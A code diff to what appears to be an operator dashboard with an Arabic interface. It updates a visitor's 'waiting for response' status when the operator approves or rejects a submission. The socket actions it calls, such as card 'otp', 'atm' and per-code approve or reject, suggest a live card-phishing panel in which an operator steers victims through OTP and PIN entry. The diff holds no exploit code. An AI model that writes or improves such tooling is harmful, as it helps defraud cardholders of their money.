@@ -987,8 +987,8 @@
           '</div>' +
           '</div>' +
           '</div>' +
-          (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium"><span class="hourglass-icon animate-bounce">⏳</span> ينتظر الرد</div>' : '') +
           (v.hasNewData ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات جديدة</div>' : '') +
+          (v.waitingForAdminResponse ? '<div class="absolute bottom-2 left-2 text-sm text-yellow-700 font-medium"><span class="hourglass-icon animate-bounce" style="font-size: 1.5em;">⏳</span> ينتظر الرد</div>' : '') +
           '</div>';
       }).join('');
       // Start timers for connected visitors
@@ -1765,10 +1765,24 @@
     // Action functions
     function approveForm(socketId) {
       socket.emit('admin:approve', { visitorSocketId: socketId });
+      // تحديث حالة الانتظار للزائر
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) {
+        visitor.waitingForAdminResponse = false;
+        renderVisitors();
+        if (selectedVisitorId === visitor._id) renderVisitorDetails(visitor);
+      }
     }
 
     function rejectForm(socketId) {
       socket.emit('admin:reject', { visitorSocketId: socketId });
+      // تحديث حالة الانتظار للزائر
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) {
+        visitor.waitingForAdminResponse = false;
+        renderVisitors();
+        if (selectedVisitorId === visitor._id) renderVisitorDetails(visitor);
+      }
     }
 
     function sendCode(socketId) {
@@ -1847,6 +1861,9 @@
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
+      // تحديث حالة الانتظار
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
@@ -1862,6 +1879,9 @@
       const originalText = btn.textContent;
       const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
+      // تحديث حالة الانتظار
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
       btn.classList.add('bg-green-600');
@@ -1876,6 +1896,9 @@
       const btn = event.target;
       const originalText = btn.textContent;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
+      // تحديث حالة الانتظار
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
@@ -1891,6 +1914,9 @@
       const btn = event.target;
       const originalText = btn.textContent;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+      // تحديث حالة الانتظار
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-green-600', 'hover:bg-green-700');
       btn.classList.add('bg-gray-500');
@@ -1905,6 +1931,9 @@
       const btn = event.target;
       const originalText = btn.textContent;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
+      // تحديث حالة الانتظار
+      const visitor = visitors.find(v => v.socketId === socketId);
+      if (visitor) { visitor.waitingForAdminResponse = false; renderVisitors(); }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
       btn.classList.add('bg-green-600');
